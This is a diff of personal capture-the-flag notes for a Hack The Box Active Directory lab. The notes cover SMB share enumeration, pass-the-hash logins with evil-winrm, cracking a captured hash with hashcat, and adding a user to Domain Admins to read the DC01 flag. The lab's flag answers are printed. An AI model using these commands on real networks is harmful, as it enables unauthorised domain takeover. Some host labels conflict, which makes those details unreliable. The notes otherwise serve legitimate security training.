@@ -152,10 +152,6 @@ sudo crackmapexec smb 172.16.7.3 -u 'BR086' -p 'Welcome1' --shares
 
 ![[Pasted image 20260609183841.png]]
 
-Use the spider_plus module to dig through the readable IPC share. Check the output file in `/tmp/cme_spider_plus/172.16.7.50.json`
-```GO
-sudo crackmapexec smb 172.16.7.3 -u 'BR086' -p 'Welcome1' --shares -M spider_plus --share 'Department Shares'
-```
 
 Cat the output file
 ```go
@@ -175,11 +171,6 @@ smbclient //172.16.7.3/Department Shares/IT/Private/Development -U br086 -c "get
 None of these worked. HTB wants me to use snaffler
 ```go
 scp Snaffler.exe htb-student@10.129.23.139:~/Desktop
-```
-
-Connect to the MS01
-```go
-evil-winrm -i 172.16.7.3  -u 'br086' -p 'Welcome1'
 ```
 
 ```go
@@ -343,7 +334,7 @@ exc3ss1ve_adm1n_r1ights!
 
 #### Question 9: Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?
 
-Log into the SQL01 host with the admins hash
+Log into the MS01 host with the admins hash
 ```go
 evil-winrm -i 172.16.7.50 -u administrator -H bdaffbfe64f1fc646a3353be1c2c3c99
 ```
@@ -440,4 +431,55 @@ hashcat -m 5600 ct059-hash /usr/share/wordlists/rockyou.txt
 Answer:
 ```go
 charlie1
+```
+
+#### Question 11: Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.
+
+DC01 Host IP
+```go
+172.16.7.3
+```
+
+The previous user has GenericAll rights, granting them complete, full control over a specific directory object. Add this user to the Domain Admins group via the net command
+```go
+CT059
+```
+
+ 
+
+RDP into SQL01 with CT059's credential
+```go
+evil-winrm -i 172.16.7.60 -u CT059 -p charlie1
+```
+
+
+
+>[!error] I can't connect to any of the machines
+> I will use a SOCKS Proxy to connect
+
+SSH'd back into htb-student with the `-X` and `-D` options
+```go
+ssh -X -D htb-student@10.129.27.160
+```
+
+I tried RDP'ing via evil-winrm but it looks like only xfreerdp is accepted/successful
+
+
+```go
+xfreerdp /v:172.16.7.50 /u:CT059 /p:'charlie1' /drive:HTB,/home/htb-student/Desktop /smart-sizing:2400x1200 /cert:ignore
+```
+
+Adding user to Domain Admins group
+```go
+net group "Domain Admins" CT059 /add /domain
+```
+
+I can now RDP into DC01 via evil-winrm
+```go
+evil-winrm -i 172.16.7.3 -u CT059 -p charlie1
+```
+
+Answer:
+```go
+acLs_f0r_th3_w1n!
 ```
